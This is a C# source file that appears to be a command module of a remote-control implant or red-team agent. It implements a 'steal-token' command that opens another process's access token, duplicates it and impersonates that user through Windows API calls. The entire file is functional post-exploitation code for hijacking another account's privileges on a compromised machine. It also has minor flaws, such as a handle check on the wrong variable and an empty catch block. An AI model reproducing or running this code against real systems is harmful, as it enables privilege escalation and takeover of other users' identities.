using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;

namespace Agent.Commands
{
    public class StealToken : AgentCommand
    {
        public override string Name => "steal-token";
        public override string Execute(AgentTask task)
        {
            //open handle to process
            //open handle to token
            //duplicate the token
            //impersonate the token 
            //close the handles



            if(!int.TryParse(task.Arguments[0], out var pid))
                    return "Failed to parse the PID";


            //open the handle to the process:

            var process = Process.GetProcessById(pid);
            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;




            try
            {
                //open the handle to the token:

                if (!Native.Advapi.OpenProcessToken(process.Handle, Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                    return "Failes to open process token";

                //duplicate the token:

                var sa = new Native.Advapi.SECURITY_ATTRIBUTES();
                if (!Native.Advapi.DuplicateTokenEx(hToken,
                    Native.Advapi.TokenAccess.TOKEN_ALL_ACCESS,
                    ref sa,
                    Native.Advapi.SecurityImpersonationLevel.SECURITY_IMPERSONATION,
                    Native.Advapi.TokenType.TOKEN_IMPERSONATION,
                    out hTokenDup))
                { 
                    return "Failed to duplicate the token";
                }

                //impersontate the token:

                if (Native.Advapi.ImpersonateLoggedOnUser(hTokenDup))
                {
                    var identity = new WindowsIdentity(hTokenDup);

                    return $"Successfully impersonated {identity.Name}";
                }


                return "Failed to impersonate the token";


            }
            catch
            {

            }
            finally
            {
                //close the handles:

                if(hToken !=IntPtr.Zero) Native.Kernel32.CloseHandle(hToken);
                if (hToken != IntPtr.Zero) Native.Kernel32.CloseHandle(hTokenDup);
                process.Dispose();
            }


            return "Unknown Error";

        }
    }
}
